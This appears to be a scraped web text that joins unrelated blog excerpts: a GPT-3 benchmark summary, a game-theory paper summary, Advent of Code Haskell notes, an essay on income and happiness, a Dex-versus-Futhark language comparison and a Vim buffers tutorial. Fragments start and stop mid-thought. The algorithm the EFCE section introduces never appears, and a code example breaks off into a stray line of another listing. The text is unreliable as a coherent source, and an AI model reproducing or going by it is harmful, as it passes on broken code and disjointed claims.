				<div><p>GPT-3 <strong>achieved</strong> 64.3% in the zero-shot setting, 68.0% in the one-shot setting, and 71.2% in the few-shot setting closed-book tests on the <em>TriviaQA</em> dataset. It <strong>outperformed</strong> fine-tuned <em>T5-11B</em> by 14.2% in a zero-shot setting. Note that <em>T5-11B</em> is finetuned, while <em>GPT-3</em> is not. It is interesting that on translation tasks, GPT-3 also sets new <strong>SOTA</strong> when it comes to translation into English. It outperforms previous unsupervised <em>NMT</em> work by 5 BLEU. For the other tasks, like Winograd-Style Tasks, Common Sense Reasoning and Reading Comprehension, GPT-3 also proved it’s superiority. Read more in the paper about it.</p>
<p>Since GPT-3 was focused on task-agnostic performance, it was not fine-tuned. This means that there is a lot more room for <strong>improvement</strong> and that we will see some results in that field rather soon.</p></div>

				<div><p>The NeurIPS commitie comment:</p>
<blockquote>
<p><em>Language models form the backbone of modern techniques for solving a range of problems in natural language processing. The paper shows that when such language models are scaled up to an unprecedented number of parameters, the language model itself can be used as a few-shot learner that achieves very competitive performance on many of these problems without any additional training. This is a very surprising result that is expected to have substantial impact in the field, and that is likely to withstand the test of time. In addition to the scientific contribution of the work, the paper also presents a very extensive and thoughtful exposition of the broader impact of the work, which may serve as an example to the NeurIPS community on how to think about the real-world impact of the research performed by the community.</em></p>

			</div> <!-- .et_pb_text --><div>
				
				
				<p>This paper addresses the problem related to game theory, computer science, and even economics. To me more specific it starts from the <strong>Nash equilibrium</strong> theory. Nash equilibrium is a concept where the <strong>optimal</strong> outcome of a game is one where no player has a motivation to deviate from her strategy after considering an opponent’s choice. For example, let’s consider two players <em>P1</em> and <em>P2</em> which choose strategies <em>S1</em> and <em>S2</em>. The set of strategies <em>(S1, S2)</em> is a Nash equilibrium if <em>P1</em> doesn’t have other strategies that provide a better payoff than <em>S1</em> in response to <em>P2</em> choosing <em>S2</em>. On the other hand, <em>P2</em> has no other strategy that does better than <em>P2</em> at maximizing her payoff in response to <em>P1</em> choosing <em>S1</em>.</p>

				<div><p>However, this theory assumes that interaction among the players is decentralized, which brings us to the conclusion that Nash Equilibrium is a distribution on the <strong>uncorrelated</strong> strategy space. The variation of this theory – <strong>Correlated Equilibrium</strong> assumes that general distribution over joint action profiles is modeled via an external <strong>mediator</strong>. This mediator, privately recommends to each player her next best action. The extension of this theory is called <strong>extensive-form correlated equilibrium (EFCE)</strong> and it is especially useful in sequential strategic interactions. According to this theory, the mediator at the beginning of the interaction gathers all possible recommendations for each step of the sequential interaction. However, she <strong>incrementally</strong> reveals relevant individual moves as the player reaches the step. At each step, the player can accept the mediator’s recommendation or disregard it, but by doing so recommendations are no longer provided for her.</p>
<p>Authors focus on a specific setting – general-sum extensive-form games with an arbitrary number of players. In practice, there is no effective way to solve <strong>EFCE</strong> for this setting. So, the authors essentially showed that is it possible to <strong>devise</strong> simple dynamics that leading to a feasible <strong>EFCE</strong>. They do so by introducing several notions. The first notion is the triggering agent. <strong>Trigger agent</strong> for player i is an agent that takes on the role of player and commits to following all recommendations unless she reaches action <em>I</em> and gets recommended to play action <em>a</em>. If this happens, the player <strong>stops</strong> committing to the recommendations and plays according to a plan until the game ends. Based on this notion of the trigger regret is defined. Trigger regret measures the regret that each trigger agent has for not having played the best-in-hindsight strategy. This is internal regret because it represents cumulative internal regret of player up to iteration <em>T</em>.</p>
<p>Finally, the authors provide an algorithm, called <strong>ICFR</strong>. This is the regret minimization algorithm that minimizes trigger agent regrets via the decomposition of these regrets locally at each information set. That algorithm looks like this:</p></div>

<p>After many years of trying unsuccessfully, I finally completed all 25 days of the <a href="https://adventofcode.com/2020/">Advent of Code 2020</a> in Haskell. Here is a summary of my learnings and solutions.</p>

<h2 id="learnings">Learnings</h2>

<ul>
  <li>GHCi is a powerful REPL. We can do almost anything in it which we can do in a file. It is also fast and great to play with code.</li>
  <li><a href="http://learnyouahaskell.com/zippers">Zippers</a> are an awesome technique to move around in a data structure. We can also think of them as focus points in spaces like lines, plains or 3D volumes. Many AoC problems are about moving around in space, doing things at the focus points. Zippers are quite suitable for such problems.</li>
  <li><a href="https://hackage.haskell.org/package/split/docs/Data-List-Split.html">Data.List.Split</a> module is good enough for basic input parsing.</li>
  <li>It is trivially easy to write a simple but feature-rich parser framework in Haskell. <a href="https://notes.abhinavsarkar.net/2020/aoc-wk2#day-7">Here</a> is one in its entirety, with some example parsers, in just 24 lines.</li>
  <li><a href="https://hackage.haskell.org/package/graph-wrapper/docs/Data-Graph-Wrapper.html">Data.Graph.Wrapper</a> is a useful wrapper over <a href="https://hackage.haskell.org/package/containers/docs/Data-Graph.html">Data.Graph</a>.</li>
  <li>Haskell is good for writing interpreters.</li>
  <li>Graph traversal + Memoization = Dynamic programming.</li>
  <li>Use <a href="https://hackage.haskell.org/package/MemoTrie/docs/Data-MemoTrie.html">Data.Memotrie</a> for side-effect-free memoization in Haskell.</li>
  <li>Sometimes it’s faster to recompute than to memoize because of the lazy nature of Haskell and the extra memory usage caused by memoization.</li>
  <li><a href="https://hackage.haskell.org/package/comonad">Comonads</a> are great to simulate <a href="https://en.wikipedia.org/wiki/Cellular_automaton">Cellular automata</a>. Zippers are comonads.</li>
  <li>Comonad based cellular automata do not mutate the state of the automata universe, neither do they compute and materialize the whole universe at every step of the automata. Rather, they just stack functions over functions to create new lazy views over the original universe. This means that we can have lazy infinite universes. This also means that simulating cellular automata using comonads tends to get slower with increasing number of neighbours/dimensions.</li>
  <li>Sometimes mutability is the only option if we want to implement a fast algorithm. Mutable vectors from the <a href="https://hackage.haskell.org/package/vector">vector</a> library are great for this.</li>
  <li>Writing the <a href="https://notes.abhinavsarkar.net/2020/aoc-wk3#day-17">four-dimensional zipper comonad</a> from scratch is complex and takes a really long time.</li>
  <li><a href="https://english.stackexchange.com/questions/56472/x-y-z-horizontal-vertical-and">There are no words</a> similar to <em>horizontal</em> and <em>vertical</em> for three dimensions or more.</li>
  <li><a href="https://hackage.haskell.org/package/base/docs/Text-ParserCombinators-ReadP.html">ReadP</a> is a good, minimal and easy to use parser framework which is included in the Haskell standard library.</li>
  <li>Try to use <a href="https://en.wikipedia.org/wiki/Bit_array">Bit arrays</a> when they fit, for performant solutions.</li>
  <li>Some problems, when scaled up, cannot be solved with lazy lists in a reasonable time.</li>
  <li>We can simulate a linked list of integers over a vector.</li>
  <li>If a program generates a lot of garbage, turning on multithreading (<code>-threaded</code>) and parallel garbage collection (<code>-qg0 -N</code>) may make it run faster.</li>
  <li>Tweaking the heap size (<code>-H</code>) and the allocation area size (<code>-A</code>) may make a program run faster.</li>
  <li>Use the <a href="https://downloads.haskell.org/~ghc/latest/docs/html/users_guide/glasgow_exts.html#extension-Strict"><code>Strict</code></a> extension cautiously. Sometimes it may unexpectedly make a program run slower.</li>
  <li><a href="https://www.youtube.com/watch?v=thOifuHs6eY">Hexagons are the bestagons</a>.</li>
</ul>

It goes something as the following. Sometime over the past four to five decades, we moved into an economy that absolutely doesn't help the working men and women. As a result prices for essentials have soared beyond all recognition, income has fallen for labour, it has fallen even further for those lower down the wealth scale, and most of the gains have all gone to the top 1%.</p><p>But one piece of insight stays inside this tale of woe much like grit in an oyster. It's the fact that annoyingly, a large enough proportion also claim to be happier than they were before.</p><p>What gives?</p><p>For one thing, the self reported life satisfaction in most countries hasn't dropped all that much. Looks like through the biggest financial crisis of around a century and the best boom times before where every stripper seemed to have briefly <a href="https://latimesblogs.latimes.com/money_co/2007/06/tuesday-morning-tales-from-the-bubble----how-a-22-year-old-stripper-bought-10-houses.html">become a real estate mogul</a>, the overall life satisfaction was ... curiously flat?What if we go further back in time?</p><div><figure><a target="_blank" href="https://cdn.substack.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2Ff7702180-6412-4ef9-89ce-59e1b082aa7a_781x485.png"><img src="https://cdn.substack.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2Ff7702180-6412-4ef9-89ce-59e1b082aa7a_781x485.png" data-attrs="{&quot;src&quot;:&quot;https://bucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com/public/images/f7702180-6412-4ef9-89ce-59e1b082aa7a_781x485.png&quot;,&quot;height&quot;:485,&quot;width&quot;:781,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:null,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:null,&quot;href&quot;:null}" alt=""></a></figure></div><p>What if we go further back in time?   </p><p>The map looks slightly more complex, but not by a lot.

I mean, Latin America seems oddly happy with all the coups and currency crises and jaguars roaming over there, but they're not off the charts. Looks like with some minor variation everyone seems to be on the same page.</p><p>So why is everyone so damn happy?</p><h2>II</h2><p>An article in the New York Times by Steven Quartz and Anette Asp called <a href="https://www.nytimes.com/2015/04/12/opinion/sunday/unequal-yet-happy.html">Unequal Yet Happy</a> makes this case.</p><blockquote><p>For most of human history, inequality of wealth meant inequality of happiness. Status, and its related activities, envy and emulation, drove consumption. By the 1950s, rapidly rising standards of living across the West, combined with social pressures to conform, all conspired to intensify status competition. The architects of “rebel cool,” like Jack Kerouac and Norman Mailer, responded by rebelling against emulation consumption and the status hierarchy of postwar America. They inverted the dominant social hierarchy, rejecting the values of those at the top and appropriating the values of those who had been marginalized at the bottom.</p><p>This trade-off comes at a political price, as it makes income inequality less emotionally salient. In a 2013 poll asking Americans to name the most important problems facing the country, only 5 percent cited income inequality or concerns about the poor or middle class (though a recent Gallup poll did find that 67 percent of Americans were dissatisfied with the current income distribution). Politicians from Senator Elizabeth Warren on the left to Representative Paul D. Ryan on the right are talking about inequality, but President Obama has lately been talking more about “opportunity.”</p><p>The proliferation of consumer choice helps explain why today’s Gilded Age hasn’t sparked as much outrage as the last one. Money may not buy happiness in the long run, but consumer choice has gone a long way in keeping most Americans reasonably content, even if they shouldn’t be.</p></blockquote><p>It essentially says that while yeah, we all hate the fact that getting sick costs a bomb, having a roof over your head is crazy expensive, and getting an education means mortgaging your whole life, but as long as you're not being actively crushed under that pressure, life's pretty great. There's Netflix ! And you can even travel anywhere you like - the airplane industry obligingly hasn't turned a profit in decades.</p><p>Is that the answer then? We're so happy with the consumer devices we carry around in our pockets that even though we don't make as much money and life's much harder, we don't care.</p><p>Chalk one up to the awesomeness of the iPhone.</p><p>But in a completely unsurprising addendum to the overall picture, turns out people are more satisfied with their life when they make more money.</p><div><figure><a target="_blank" href="https://cdn.substack.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2Faa0b3321-c20d-42b8-83bd-45dd56610d88_3000x2100.png"><img src="https://cdn.substack.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2Faa0b3321-c20d-42b8-83bd-45dd56610d88_3000x2100.png" data-attrs="{&quot;src&quot;:&quot;https://bucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com/public/images/aa0b3321-c20d-42b8-83bd-45dd56610d88_3000x2100.png&quot;,&quot;height&quot;:1019,&quot;width&quot;:1456,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:null,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:null,&quot;href&quot;:null}" alt=""></a></figure></div><p>So there is an unmistakable and very strong correlation across income and happiness across most countries.

He said, looking at the time when satisfaction stagnated in the US between 1946 and 1970, that while richer countries have higher happiness levels, the growth rates in the happiness levels in richer countries didn't seem to be keeping pace with the increase in national incomes.

Could it be that the growth that we're seeing in GDP comes primarily from growth in population? That would mean that that while GDP is growing, it's doing so because there are just more people. They can't all be equally happy at something they made come about by the difficult feat of being born.</p><p>To quote from <a href="https://www.pnas.org/content/107/52/22463">his paper</a>:</p><blockquote><p>Simply stated, the happiness–income paradox is this: at a point in time both among and within nations, happiness varies directly with income, but over time, happiness does not increase when a country's income increases. We are talking here about the time series relationship of happiness and income in the long term, usually at least 10 years, sometimes more. As we shall see, the short-term relationship is a different story.</p></blockquote><p>This though only seemed to hold across countries as in the charts above. And it's not a linear relationship by any means, more of a trend seen from above. Just growing doesn't seem to be enough to get people happy.</p><p>The problem with the charts above is that they're point-in-time snapshots, and even the ones that seem to draw trends from one time to another seem to pick few datapoints rather than do even a cursory p-hack.</p><p>And the argument that Easterlin et al advance is that in the long run, a higher rate of economic growth by itself does not result in a greater increase in happiness.</p><p>The plot thickens.</p><h2>III</h2><p>The answer it seems, as is so often the case, comes from unpacking the "average" that's measured into it's component distribution.</p><p>Take the US for instance. The answer is not that people have gotten unhappier in the US in aggregate, or even in average. It's that while there has been modest growth in incomes over this period, it's barely kept pace, which means that the happiness index has been (at best) flat. While this isn't true if you do that graph solely for the top 1% in the income percentile, they don't seem to matter enough to sway this particular graph. While they do matter enough to sway the average income and GDP per capita graphs.</p><blockquote><p><a href="https://www.pnas.org/content/107/52/22463">This article</a> also contributes unique systematic evidence for developing and transition countries that short-term contractions and expansions are accompanied by corresponding movements in subjective well-being. Thus, in the short term, happiness and SWB are positively related, but over the long term—here, usually a minimum period of 10 y—the relationship is nil. The happiness–income paradox now holds for countries ranging from poor to rich: among countries, at a point in time happiness and income are positively related, but over time within a country, happiness does not increase as income goes up.</p><p>Consider, for example, three countries included here with very high recent growth rates of GDP—China, South Korea, and Chile. China's growth rate implies a doubling of real per capita income in less than 10 y; South Korea's, in 13 y; and Chile's, in 18 y. With the real per capita amount of goods multiplying so rapidly in a fraction of a lifetime, one might think many of the people in these countries would be so happy, they'd be dancing in the streets. Yet both China and Chile show mild (not statistically significant) declines in life satisfaction</p></blockquote><p>What this seems to indicate is that the impact of change in economic circumstances takes time to get ossified into the societal structures which (not too rapidly) increases satisfaction. So what does make people happy, or at least satisfied with their life? It's like a combination of a current reality metric and a future expectation metric. You need to feel like life's pretty good right now and also that it will continue to get better.</p><p>Easterlin also spoke about something quite similar. That our expectations from life grows as time goes on and incomes increase, so …</p></div></div>

</p>

<p><a href="https://github.com/google-research/dex-lang">Dex</a> is a functional array programming language developed by a team of researchers at Google. I recently re-read <a href="https://openreview.net/pdf?id=rJxd7vsWPS">their paper</a>, which got me excited enough to want to take a closer look. Dex and Futhark are more or less aimed at the same kinds of problems, so my interpretation of Dex is rooted in how it differs from Futhark. In this post I will describe some of the interesting differences based on <a href="https://futhark-lang.org/examples.html#examples-from-dex">translating five Dex example programs to Futhark</a>. I’m not a Dex expert, so maybe I’ve missed a thing here or there.</p>
<p>Futhark wasn’t originally designed to be a user-facing programming language. We were doing research in compiler optimisations for parallel computers, and the language was just a crude little thing so we could write programs for our optimiser to work on. Over time the language grew and eventually became fairly pleasant to use (<a href="https://futhark-lang.org/blog/2017-12-27-reflections-on-a-phd-accidentally-spent-on-language-design.html">full story here</a>), but it was still never designed as a cohesive or novel approach to array programming. That also means it’s fairly conventional or even old-fashioned, as functional languages go. In contrast, Dex’s authors had more imagination and designed their language from the start with novel ideas, chief of which is to consider <em>index sets as types</em>. To illustrate the idea, here is how to compute all-pairs L₁ distances in Dex:</p>
<pre><code>pairwiseL1 ::  n=&gt;d=&gt;Real -&gt; n=&gt;n=&gt;Real
pairwiseL1 x = for i j.sum (for k. abs (x.i.k - x.j.k))</code></pre>
<p>The <code>n=&gt;d=&gt;Real</code> is the type of an <code>n</code> by <code>d</code> array of <code>Real</code>s. Dex leans heavily on an analogy between arrays and functions, as arrays can be seen as merely functions from indexes to values. In Futhark, we’d write this type as <code>[n][d]Real</code>. Note that in Dex, <code>n</code> and <code>d</code> are completely abstract type parameters, while in Futhark they are term-level variables.</p>
<p>The real advantage of Dex’s approach is that it permits a very lightweight notation for index spaces. For example, <code>for i j.e</code> produces a two-dimensional array where each element is given by the expression <code>e</code>, and the type checker figures out the span of <code>i</code> and <code>j</code> based on the context. For example, in <code>for k</code>, Dex figures out that <code>k</code> must be part of the index set <code>d</code>, because it is used to index the innermost dimension of <code>x</code>. Pretty cool!</p>
<p>A naive translation to Futhark would be this:</p>
<div id="cb2"><pre><code><span id="cb2-1"><span>let</span> pairwiseL1 [n][d] (x: [n][d]f64) =</span>
<span id="cb2-2">  tabulate_<span>2</span>d n n (\i j -&gt; f64.sum (tabulate d (\k -&gt; x[i,k] - x[j,k])))</span></code></pre></div>
<p>Note that the tabulation functions require explicit size-passing, and that the indexes are just integers - the type checker will not help us if we accidentally use the <code>k</code> along the wrong dimension.</p>
<p>Of course, the above is not how you’d actually write this program in Futhark. Instead you’d first define a function for computing the L₁ distance:</p>
<div id="cb3"><pre><code><span id="cb3-1"><span>let</span> L1 [n] (xs: [n]f64) (ys: [n]f64) : f64 =</span>
<span id="cb3-2">  map2 (-) xs ys |&gt; map f64.abs |&gt; f64.sum</span></code></pre></div>
<p>And then you’d apply it to all the pairs:</p>
<div id="cb4"><pre><code><span id="cb4-1"><span>let</span> pairwiseL1 [n][m] (xss: [n][m]f64) : [n][n]f64 =</span>
<span id="cb4-2">  map (\a -&gt; map (\b -&gt; L1 a b) xss) xss</span></code></pre></div>
<p>I think this program illustrates the main difference in philosophy between Dex and Futhark. While Dex uses dependent types to secure an index-based notation, Futhark instead encourages index-free programming. I suspect the two approaches are fundamentally equivalent, but it’s an interesting contrast that I think is due to the two language’s different backgrounds. Dex is specifically designed to implement scientific code and formulae, which is traditionally very index-oriented. Futhark is more about supporting a “traditional” combinator-based functional programming style, but just making it run much faster. You could view Futhark as a data-parallel ML, while Dex is <a href="https://en.wikipedia.org/wiki/Einstein_notation">higher-order dependently typed Einstein summation</a>.</p>
<p>I also suspect this focus on indexes is because the Dex authors have a background of being frustrated with NumPy-style programming, where the absence of efficient indexing can be quite restrictive. They even even use this NumPy implementation of L₁ distances as motivation in their paper:</p>
<pre><code>def pairwiseL1(x):
  return sum(abs(x.T - x[..., newaxis]), axis=1)</code></pre>
<p>I certainly agree that this is hard to read.</p>
<h2 id="the-good-ones"><a href="#the-good-ones" id="the-good-ones-link" title="the-good-ones">The good ones</a></h2>
<p>Porting a two-line Dex program to Futhark is enough to wax philosophically for a paragraph or two, but it’s still a pretty shallow comparison. Therefore, I also ported five of <a href="https://github.com/google-research/dex-lang/tree/main/examples">the Dex example programs</a>, plus whatever of the <a href="https://github.com/google-research/dex-lang/blob/main/lib/prelude.dx">Dex prelude</a> I needed along the way. I’m not going to claim that I ported the five most difficult programs, but at least one of them was quite complicated. The Futhark programs total about 450 lines of code (excluding comments and blanks).</p>
<p>My general impression is that when it comes to expressing parallelism, Dex and Futhark are about equivalent. Dex’s index notation is more concise, but I personally find it slightly easier to understand and decompose Futhark expressions. As an example, this Dex function computes the covariance of a matrix:</p>
<pre><code>def covariance (n:Type) ?-&gt; (d:Type) ?-&gt;
    (xs:n=&gt;d=&gt;Float) : (d=&gt;d=&gt;Float) =
   xsMean :    d=&gt;Float = (for i. sum for j. xs.j.i) / IToF (size n)
   xsCov  : d=&gt;d=&gt;Float = (for i i'. sum for j.
                           (xs.j.i' - xsMean.i') *
                           (xs.j.i  - xsMean.i )   ) / IToF (size n - 1)

<span id="cb7-10">          xsT means</span></code></pre></div>
<p>It’s certainly more verbose, but I had to read the Dex function carefully to understand what the indexes implied, while I have a much easier time understanding the structure of the computation from the Futhark formulation. Of course, I also have years of experience with Futhark, compared to just days with Dex.</p>
<p>Most of the translations were pretty simple, for example the <a href="https://futhark-lang.org/examples/dex-mandelbrot.html">Mandelbrot set</a>, <a href="https://futhark-lang.org/examples/dex-pi.html">Monte Carlo pi</a>, and <a href="https://futhark-lang.org/examples/dex-brownian-motion.html">Brownian motion</a> programs. One difference that made me feel <em>major</em> jealousy is that the <code>dex script</code> command is also able to generate <a href="https://google-research.github.io/dex-lang/mandelbrot.html">pleasant reports</a> containing both the code and visualisations and plots of various values. We definitely need a tool like this for Futhark!</p>
<p>The <a href="https://futhark-lang.org/examples/dex-sierpinski.html">Sierpinski triangle</a> program has a fun little detail in Dex, which is that the <code>randIdx</code> function uses the Dex type system to determine the range of the index being produced. While the <code>randIdx</code> function itself can still be wrong, this makes it hard to <em>use</em> it incorrectly. The Futhark translation of <code>randIdx</code> asks the user to pass in a range explicitly, and also returns just an integer.</p>
<h2 id="the-bad-one"><a href="#the-bad-one" id="the-bad-one-link" title="the-bad-one">The bad one</a></h2>
<p>The largest ported example by far is <a href="https://futhark-lang.org/examples/dex-raytrace.html">a ray tracer</a>. It uses ray marching with <a href="https://en.wikipedia.org/wiki/Signed_distance_function">signed distance functions</a> to describe objects. The Dex program rather casually uses the <code>grad</code> operator to apply <a href="https://en.wikipedia.org/wiki/Automatic_differentiation">automatic differentiation (AD)</a> to compute surface normals from the distance function. This is a really elegant technique, but Futhark does not (yet!) have a <code>grad</code> operator. In Futhark, the sensible thing to do is to hard-code the gradient functions for the three different kinds of objects, so of course I instead used <a href="https://futhark-lang.org/examples/dual-numbers.html">forward-mode AD with dual numbers</a> implemented via the Futhark module system. The resulting code finally convinced me that built-in AD is a necessity for a modern numerical languages. I was on the fence before, since I worry that doing it well will be invasive in both the language and compiler, but I never want to write this kind of boilerplate again.</p>
<p>The rest of the ray tracer was fairly straightforward to implement. Dex uses its effect system to implement the loop where the lights in the scene apply their contributions to a given point, which I wrote in Futhark as basically a fold. In fact, I didn’t yet find a Dex example where the effect system was more than a small notational convenience. I’m sure there’s one, though! Effect systems are not things you just add on a lark.</p>
<p>There was one part that confused me initially, but which makes perfect sense in retrospect. The ray tracer normalises the intensity of all pixels (triples of floats) based on the average intensity (unusual I think, but fine). In Dex this is done like this:</p>
<pre><code>image / mean (for (i,j,k). image.i.j.k)</code></pre>
<p>When I first read this, I couldn’t figure out whether it was normalising <em>per channel</em>. I always get a bit wary when overloaded operators like that <code>/</code> are involved. Of course, that <code>for</code>-expression is over a <em>single</em> index that just happens to be a triple, and the components of which are then used to index the three-dimensional <code>image</code> array. It’s really just flattening the array, and the type checker makes the individual <code>i</code>, <code>j</code> and <code>k</code>s take on the appropriate value.</p>
<h2 id="conclusions"><a href="#conclusions" id="conclusions-link" title="conclusions">Conclusions</a></h2>
<p>With respect to expressing parallelism, Dex and Futhark seem equivalent in expressive power, but Dex has the edge in concision. I’d be curious about going the other way, and porting some of the original Futhark benchmark programs <em>to</em> Dex, like <a href="https://github.com/diku-dk/futhark-benchmarks/blob/master/finpar/LocVolCalib.fut">local volumetric calibration</a>.</p>
<p>Dex has several small conveniences over Futhark: while the effect system didn’t matter much for the examples I looked at, Dex’s type classes and broadcasting operators did help a bit with making things more concise.</p>
<p>If you need AD, then Dex is miles ahead of Futhark. While I managed to implement the surface normals in the ray tracer, I gave up on porting <a href="https://google-research.github.io/dex-lang/mcmc.html">mcmc.dx</a> because it contains a higher-order function that applies the <code>grad</code> operator to a functional argument. This would have to be implemented with a higher order parametric module (<a href="https://futhark-lang.org/blog/2019-12-18-design-flaws-in-futhark.html#higher-order-modules">which I wrote were useless not long ago</a>), but I just didn’t have the heart for it. I’ll keep this as a usage case for when we implement AD properly.</p>
<p>I didn’t look much at performance, since Dex is sparsely documented and the benchmarking tools seem to be mostly for internal use. I performed a rough timing of sequential execution of the ray tracer, where the Futhark and Dex versions are about equally fast. Dex also has multi-threaded and CUDA backends, but I …</p></div></div>

            <p>Welcome to the second part of this series aimed to make you a better Vim user! If you have no idea about Vim, you should begin with <a href="https://thevaluable.dev/vim-for-beginners/" target="_blank" rel="noopener">the first part</a>. In this article, I’ll explain many more concepts, some of them making Vim truly special compared to other editors. Who wasn’t blown away discovering Vim’s macros?</p>
<p>Specifically, we’ll see together:</p>
<ul>
<li>Ways you can organize open files in Vim using buffers, windows, tabs, and the argument list.</li>
<li>Useful motions to jump quickly from one place to another in your entire codebase.</li>
<li>Mapping new keystrokes to old keystrokes or commands.</li>
<li>Powerful functionalities to repeat some of your keystrokes.</li>
<li>Ways of manipulating the command line history.</li>
<li>Plugins which offers different ways to manage some ideas we saw before.</li>
</ul>
<p>The amount of information in this article can feel overwhelming. My advice: take your time and don’t try to swallow everything at once. Experiment with Vim as you read along, try to understand how it works, and you’ll have a powerful tool you can control entirely with your keyboard.</p>


  






    









<p>You’ll see at the end of each sections some related Vim’s help commands. You can read these help sections directly in Vim when you’re ready to dive deeper.</p>
<h2 id="vims-spatial-organization">Vim’s Spatial Organization</h2>
<p>If you’re using an IDE, you’re certainly used to manage your files with tabs. Vim use other ways to represent and organize open files. Indeed, there are four <a href="https://thevaluable.dev/abstraction-type-software-example/">layers of abstraction</a> you can use for that: the <em>buffers</em>, the <em>windows</em>, the <em>tabs</em>, and the <em>argument list</em>.</p>
<h3 id="buffers">Buffers</h3>
<p>A <em>buffer</em> directly match an open file in memory. To make a comparison with a standard IDE, a buffer would be the <em>content</em> of a tab. The big difference: when you close a tab in an IDE, you close the file as well. Not in Vim; if you close a window containing a buffer, the buffer is still there, <em>hidden</em>.</p>
<p>In fact, a buffer can have three different states:</p>
<ul>
<li><em>active</em> - The buffer is displayed in a window.</li>
<li><em>hidden</em> - The buffer is not displayed, but it exists and the file is still open.</li>
<li><em>inactive</em> - The buffer is not displayed and <em>empty</em>. It’s not linked to any file.</li>
</ul>
<p>The content of a file in a hidden buffer is not directly visible in Vim. At that point, you might wonder: how do we know that this buffer is still open, if we can’t see it?</p>
<p>To see all opened buffered, we can look at the <em>buffer list</em>. You can use the command <code>:buffers</code> to display it. Each line contains:</p>
<ol>
<li>The buffer unique ID.</li>
<li>Indicators displaying different informations (for example <code>a</code> for active, <code>h</code> for hidden, or <code> </code> (space) for inactive).</li>
<li>The name of the buffer, if any. It can be the filepath of the file linked to the buffer.</li>
<li>The line number where the cursor is.</li>
</ol>
<p>For example: <code>27  %a   "layouts/shortcodes/notice.html" line 18</code> means that the buffer ID 27 is in state <code>a</code> (active), its name is <code>layouts/shortcodes/notice.html</code> and the cursor in this specific buffer is on line 18. You can as well know what’s the current buffer displayed with the flag <code>%</code> just before its state.</p>
<p>To navigate through the buffer list, you can use these commands:</p>
<ul>
<li><code>:buffer &lt;ID_or_name&gt;</code>- Move to the buffer using its ID or its name.</li>
<li><code>:bnext</code> or <code>:bn</code> - Move to the next buffer.</li>
<li><code>:bprevious</code> or <code>:bp</code> - Move to the previous buffer.</li>
<li><code>:bfirst</code> or <code>:bf</code> - move to the first buffer.</li>
<li><code>:blast</code> or <code>:bl</code> - move to the last buffer.</li>
<li><code>CTRL-^</code> - switch to the alternative buffer. It’s indicated in your buffer list with the symbol <code>#</code>.</li>
<li><code>&lt;ID&gt;CTRL-^</code> - Switch to a specific buffer with ID <code>&lt;ID&gt;</code>. For example, <code>75CTRL-^</code> switch to the buffer with ID 75.</li>
</ul>
<p>You can as well apply a command to all buffers using <code>:bufdo &lt;command&gt;</code>.</p>
<p>Not all buffers are displayed in the buffer list. To display unlisted buffers, you can use the command <code>:buffers!</code> or <code>ls!</code>. You’ll see unlisted buffer with an indicator <code>u</code> just after its ID.</p>
<p>Now, let’s ask this existential question: how can we create buffers?</p>
<ul>
<li>If you create a window, a buffer will be created automatically (see below).</li>
<li><code>:badd &lt;filename&gt;</code> - Add <code>&lt;filename&gt;</code> to the buffer list.</li>
</ul>
<p>If we can create buffers, we should be able to delete them:</p>
<ul>
<li><code>:bdelete &lt;ID_or_name&gt;</code> - Delete a buffer by ID or name. You can specify more than one ID or name separated with spaces to delete multiple buffers.</li>
<li><code>:1,10bdelete</code> - Delete buffers from ID 1 to 10 included.</li>
<li><code>:%bdelete</code> - Delete all buffers.</li>
</ul>
<p>If you modify a file, forget to save it, and close the window making the buffer hidden, you won’t be able to quit Vim. It will complain that you’re hidden buffer is not saved; to get around that, I would recommend to set the option hidden in your vimrc (by default <code>~/.vimrc</code>), as follow:</p>
<pre><code>set hidden
</code></pre><p>You can try it directly in your current session by running the command <code>:set hidden!</code> to toggle the option on and off. You can play around with it and see what suits best for you.</p>
<p>To see the value of any option, you can use a question mark. For example: <code>:set hidden?</code> or <code>:set filetype?</code>.</p>


  




    





  

<div>
    
    <div>
         <ul>
<li><code>:help buffers</code></li>
<li><code>:help :buffers</code></li>
</ul>
 
    </div>
</div>



<h3 id="windows">Windows</h3>
<p>A window in Vim is nothing more than a space you can use to display the content of a buffer. Don’t forget: when you close the window, the buffer stays open.</p>
<p>When you open Vim, one window with one empty buffer are automatically created.</p>
<p>To create windows, you can use the <code>:new</code> command, or one of these keystrokes:</p>
<ul>
<li><code>CTRL-W s</code> - Split the current window horizontally.</li>
<li><code>CTRL-W v</code> - Split the current window vertically.</li>
<li><code>CTRL-W n</code> - Split the current windows horizontally and edit a new file.</li>
<li><code>CTRL-W ^</code> - Split the current with the <em>alternate file</em> (buffer with the <code>#</code> indicator in your buffer list).</li>
<li><code>&lt;buffer_ID&gt;CTRL-W ^</code> - Split windows with the buffer of ID <code>&lt;ID&gt;</code>. For example, <code>75 CTRL-W ^</code> will open a window with the buffer of ID 75.</li>
</ul>
<p>To move your cursor from one window to another, you can use:</p>
<ul>
<li><code>CTRL-W &lt;Down&gt;</code> or <code>CTRL-W j</code></li>
<li><code>CTRL-W &lt;Up&gt;</code> or <code>CTRL-W k</code></li>
<li><code>CTRL-W &lt;Left&gt;</code> or <code>CTRL-W h</code></li>
<li><code>CTRL-W &lt;right&gt;</code> or <code>CTRL-W l</code></li>
</ul>
<p>You always dreamt to move the windows? Me too. Here’s how to do it:</p>
<ul>
<li><code>CTRL-W r</code> - Rotate the windows.</li>
<li><code>CTRL-W x</code> - Exchange with the next window</li>
</ul>
